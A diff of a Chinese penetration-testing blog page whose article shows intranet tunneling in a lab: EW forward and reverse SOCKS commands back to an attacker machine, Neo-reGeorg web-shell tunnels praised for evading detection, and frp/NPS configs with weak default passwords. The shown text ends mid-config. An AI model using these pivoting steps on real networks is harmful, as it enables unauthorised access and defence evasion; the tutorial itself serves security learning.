@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="../../../../../img/fluid.png">
+  <link rel="icon" href="../../../../../img/fluid.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://idea-oss.github.io/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.png">
 <meta property="article:published_time" content="2022-06-15T05:50:44.000Z">
-<meta property="article:modified_time" content="2022-06-20T05:21:27.306Z">
+<meta property="article:modified_time" content="2024-01-07T08:09:40.892Z">
 <meta property="article:author" content="iDea">
 <meta property="article:tag" content="内网穿透">
 <meta property="article:tag" content="内网渗透">
@@ -58,12 +58,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-<link  rel="stylesheet" href="/css/main.css" />
+<link  rel="stylesheet" href="../../../../../css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="../../../../../css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="../../../../../css/highlight-dark.css" />
   
 
 
@@ -79,8 +79,8 @@
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
+  <script  src="../../../../../js/utils.js" ></script>
+  <script  src="../../../../../js/color-schema.js" ></script>
 
   
 <meta name="generator" content="Hexo 6.2.0"></head>
@@ -95,7 +95,7 @@
 <div class="header-inner" style="height: 85vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/">
+    <a class="navbar-brand" href="../../../../../index.html">
       <strong>iDea</strong>
     </a>
 
@@ -114,7 +114,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/">
+              <a class="nav-link" href="../../../../../index.html">
                 <i class="iconfont icon-home-fill"></i>
                 首页
               </a>
@@ -126,7 +126,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/archives/">
+              <a class="nav-link" href="../../../../../archives/">
                 <i class="iconfont icon-archive-fill"></i>
                 归档
               </a>
@@ -138,7 +138,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/categories/">
+              <a class="nav-link" href="../../../../../categories/">
                 <i class="iconfont icon-category-fill"></i>
                 分类
               </a>
@@ -150,7 +150,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tags/">
+              <a class="nav-link" href="../../../../../tags/">
                 <i class="iconfont icon-tags-fill"></i>
                 标签
               </a>
@@ -162,7 +162,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/about/">
+              <a class="nav-link" href="../../../../../about/">
                 <i class="iconfont icon-user-fill"></i>
                 关于
               </a>
@@ -191,7 +191,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/./img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.png') no-repeat center center; background-size: cover;">
+     style="background: url('../../../../.././img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.5)">
       <div class="banner-text text-center fade-in-up">
@@ -284,40 +284,39 @@
 <p>6中链路状态 -s参数：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssocksd    rcsocks   rssocks<br>lcx_slave  lcx_tran  lcx_listen<br>其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。<br><br>lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。<br><br>lcx_slave 控制管道：一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。<br><br>lcx_tran 转发管道：通过监听本地端口接收代理请求，并转交给代理提供主机。<br><br>lcx_listen 监听管道：通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。<br><br>通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。<br></code></pre></td></tr></table></figure>
 
-<p>实验环境：<br><img src="https://img-blog.csdnimg.cn/20210511183651865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>实验环境：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107155935229.png" srcset="/img/loading.gif" lazyload alt="image-20240107155935229"></p>
 <p>EW是一套便携式的网络工具，具有SOCKS5服务架设和端口转发两大核心功能，可以在复杂的网络环境中实现网络穿透。同时EW能够以正向，反向，多级级联等方式建立网络隧道。<br>（1）正向连接<br>在web服务器上执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew  -s ssocksd -l 8888<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210510172723317.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>在socksCap64添加这个IP地址的代理<br><img src="https://img-blog.csdnimg.cn/20210510172826510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>在攻击机上访问内网目标主机：<br><img src="https://img-blog.csdnimg.cn/20210511183932818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107155943083.png" srcset="/img/loading.gif" lazyload alt="image-20240107155943083">在socksCap64添加这个IP地址的代理<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107155952271.png" srcset="/img/loading.gif" lazyload alt="image-20240107155952271"><br>在攻击机上访问内网目标主机：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160003617.png" srcset="/img/loading.gif" lazyload alt="image-20240107160003617"></p>
 <p>（2）反向连接<br>在web服务器上执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew -s rssocks -d 192.168.43.234 -e 1111<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210511185158276.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160011248.png" srcset="/img/loading.gif" lazyload alt="image-20240107160011248"></p>
 <p>在攻击上执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew  -s rcsocks -l 1008 -e 888<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210511185217485.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210511185347436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160019595.png" srcset="/img/loading.gif" lazyload alt="image-20240107160019595"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160028898.png" srcset="/img/loading.gif" lazyload alt="image-20240107160028898"></p>
 <p>更多参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/259634.html">https://www.freebuf.com/sectool/259634.html</a></p>
-<p><strong>Neo-reGeorg</strong><br>它是由reGeorg经过大佬改版的。<br>它的优势是做了加密处理，避免特征检测，生成的脚本也免杀！！<br>实验环境：<br><img src="https://img-blog.csdnimg.cn/20210511205417330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>首先先生成加密脚本</p>
+<p><strong>Neo-reGeorg</strong><br>它是由reGeorg经过大佬改版的。<br>它的优势是做了加密处理，避免特征检测，生成的脚本也免杀！！<br>实验环境：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160045055.png" srcset="/img/loading.gif" lazyload alt="image-20240107160045055"><br>首先先生成加密脚本</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python .\neoreg.py generate -k one<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210511205721691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210511205746823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>攻击上运行进行隧道建立</p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160054903.png" srcset="/img/loading.gif" lazyload alt="image-20240107160054903"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160104847.png" srcset="/img/loading.gif" lazyload alt="image-20240107160104847"><br>攻击上运行进行隧道建立</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python neoreg.py -k one -u http://192.168.43.58/tunnel.php<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210511205832821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>成功建立的连接<br>配置本地代理</p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160124136.png" srcset="/img/loading.gif" lazyload alt="image-20240107160124136"><br>成功建立的连接<br>配置本地代理</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210511205854993.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>测试与目标机连通<br><img src="https://img-blog.csdnimg.cn/202105112059058.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>frp</strong><br>攻击机设置frps.ini</p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160133759.png" srcset="/img/loading.gif" lazyload alt="image-20240107160133759">测试与目标机连通<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160144683.png" srcset="/img/loading.gif" lazyload alt="image-20240107160144683"><strong>frp</strong><br>攻击机设置frps.ini</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>bind_port = 6666<br></code></pre></td></tr></table></figure>
 <p>运行如下命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">frps.exe -c frps.ini<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210511210815522.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160156584.png" srcset="/img/loading.gif" lazyload alt="image-20240107160156584"></p>
 <p>在边缘机器设置frpc.ini</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>server_addr = 192.168.10.3<br>server_port = 6666<br>[http_proxy]<br><span class="hljs-built_in">type</span>=tcp<br>remote_port=7777<br>plugin=socks5<br></code></pre></td></tr></table></figure>
 
-
-<p><img src="https://img-blog.csdnimg.cn/20210511211513845.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210511211800156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160204408.png" srcset="/img/loading.gif" lazyload alt="image-20240107160204408"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160216228.png" srcset="/img/loading.gif" lazyload alt="image-20240107160216228"></p>
 <p><strong>NPS</strong><br>NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">项目地址：https://github.com/ehang-io/nps/releases/tag/v0.26.9 <br></code></pre></td></tr></table></figure>
 <p>服务端配置文件如下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash">appname = nps<br><span class="hljs-comment">#Boot mode(dev|pro)</span><br>runmode = dev<br><br><span class="hljs-comment">#HTTP(S) proxy port, no startup if empty</span><br>http_proxy_ip=0.0.0.0<br>http_proxy_port=80     <span class="hljs-comment">#域名代理http代理监听端口</span><br>https_proxy_port=443   <span class="hljs-comment">#域名代理https代理监听端口(一般会修改这两个端口，避免端口冲突)</span><br>https_just_proxy=<span class="hljs-literal">true</span><br><span class="hljs-comment">#default https certificate setting</span><br>https_default_cert_file=conf/server.pem<br>https_default_key_file=conf/server.key<br><br><span class="hljs-comment">##bridge</span><br>bridge_type=tcp      <span class="hljs-comment">#客户端与服务端连接方式kcp或tcp</span><br>bridge_port=8024     <span class="hljs-comment">#服务端客户端通信端口，也就是说客户端通过访问服务端的这个端口可以进行连接</span><br>bridge_ip=0.0.0.0<br><br><span class="hljs-comment"># Public password, which clients can use to connect to the server</span><br><span class="hljs-comment"># After the connection, the server will be able to open relevant ports and parse related domain names according to its own configuration file.</span><br>public_vkey=123      <span class="hljs-comment">#客户端以配置文件模式启动时的密钥，设置为空表示关闭客户端配置文件连接模式</span><br><br><span class="hljs-comment">#Traffic data persistence interval(minute)</span><br><span class="hljs-comment">#Ignorance means no persistence</span><br><span class="hljs-comment">#flow_store_interval=1   #服务端流量数据持久化间隔，单位分钟，忽略表示不持久化</span><br><br><span class="hljs-comment"># log level LevelEmergency-&gt;0  LevelAlert-&gt;1 LevelCritical-&gt;2 LevelError-&gt;3 LevelWarning-&gt;4 LevelNotice-&gt;5 LevelInformational-&gt;6 LevelDebug-&gt;7</span><br>log_level=7         <span class="hljs-comment">#日志输出级别</span><br><span class="hljs-comment">#log_path=nps.log</span><br><br><span class="hljs-comment">#Whether to restrict IP access, true or false or ignore</span><br><span class="hljs-comment">#ip_limit=true      #是否限制ip访问，true或false或忽略</span><br><br><span class="hljs-comment">#p2p</span><br><span class="hljs-comment">#p2p_ip=127.0.0.1    #服务端IP，使用p2p模式必填</span><br><span class="hljs-comment">#p2p_port=6000       #p2p模式开启的udp端口</span><br><br><span class="hljs-comment">#web</span><br>web_host=a.o.com<br>web_username=admin   <span class="hljs-comment">#web界面管理账号</span><br>web_password=123     <span class="hljs-comment">#web界面管理密码</span><br>web_port = 8080      <span class="hljs-comment">#web管理端口，通过访问该端口可以访问NPS后台</span><br>web_ip=0.0.0.0<br>web_base_url=        <span class="hljs-comment">#web管理主路径,用于将web管理置于代理子路径后面</span><br>web_open_ssl=<span class="hljs-literal">false</span><br>web_cert_file=conf/server.pem<br>web_key_file=conf/server.key<br><span class="hljs-comment"># if web under proxy use sub path. like http://host/nps need this.</span><br><span class="hljs-comment">#web_base_url=/nps</span><br><br><span class="hljs-comment">#Web API unauthenticated IP address(the len of auth_crypt_key must be 16)</span><br><span class="hljs-comment">#Remove comments if needed</span><br><span class="hljs-comment">#auth_key=test       #web api密钥</span><br>auth_crypt_key =1234567812345678    <span class="hljs-comment">#获取服务端authKey时的aes加密密钥，16位</span><br><br><span class="hljs-comment">#allow_ports=9001-9009,10001,11000-12000</span><br><br><span class="hljs-comment">#Web management multi-user login</span><br>allow_user_login=<span class="hljs-literal">false</span><br>allow_user_register=<span class="hljs-literal">false</span><br>allow_user_change_username=<span class="hljs-literal">false</span><br><br><br><span class="hljs-comment">#extension</span><br>allow_flow_limit=<span class="hljs-literal">false</span><br>allow_rate_limit=<span class="hljs-literal">false</span><br>allow_tunnel_num_limit=<span class="hljs-literal">false</span><br>allow_local_proxy=<span class="hljs-literal">false</span><br>allow_connection_num_limit=<span class="hljs-literal">false</span><br>allow_multi_ip=<span class="hljs-literal">false</span><br>system_info_display=<span class="hljs-literal">false</span><br><br><span class="hljs-comment">#cache</span><br>http_cache=<span class="hljs-literal">false</span><br>http_cache_length=100<br><br><span class="hljs-comment">#get origin ip</span><br>http_add_origin_header=<span class="hljs-literal">false</span><br><br><span class="hljs-comment">#pprof debug options</span><br><span class="hljs-comment">#pprof_ip=0.0.0.0       #debug pprof 服务端IP</span><br><span class="hljs-comment">#pprof_port=9999        #debug pprof 端口</span><br><br><span class="hljs-comment">#client disconnect timeout</span><br>disconnect_timeout=60   <span class="hljs-comment">#客户端连接超时，单位 5s，默认值 60，即 300s = 5mins</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210511234440814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>运行即可：<br><img src="https://img-blog.csdnimg.cn/20210511234539451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>登录web界面   admin&#x2F;123<br>配置<br><img src="https://img-blog.csdnimg.cn/2021051123462283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210511234702300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>点击添加<br><img src="https://img-blog.csdnimg.cn/20210511234729659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210511234901339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>客户端配置文件：</p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160229829.png" srcset="/img/loading.gif" lazyload alt="image-20240107160229829"><br>运行即可：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160238500.png" srcset="/img/loading.gif" lazyload alt="image-20240107160238500"><br>登录web界面   admin&#x2F;123<br>配置<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160247561.png" srcset="/img/loading.gif" lazyload alt="image-20240107160247561"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160257667.png" srcset="/img/loading.gif" lazyload alt="image-20240107160257667"><br>点击添加<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160306745.png" srcset="/img/loading.gif" lazyload alt="image-20240107160306745"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160316184.png" srcset="/img/loading.gif" lazyload alt="image-20240107160316184"><br>客户端配置文件：</p>
 <p>友情提示:这里将配置文件写出来主要是为了让大家了解配置文件的内容，如果觉得配置文件太过繁琐，大多数情况下只需要关注server_addr、conn_type、和vkey这三个参数即可。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>server_addr=127.0.0.1:8024<br>conn_type=tcp<br>vkey=123<br>auto_reconnection=<span class="hljs-literal">true</span><br>max_conn=1000<br>flow_limit=1000<br>rate_limit=1000<br>basic_username=11<br>basic_password=3<br>web_username=user<br>web_password=1234<br>crypt=<span class="hljs-literal">true</span><br>compress=<span class="hljs-literal">true</span><br><span 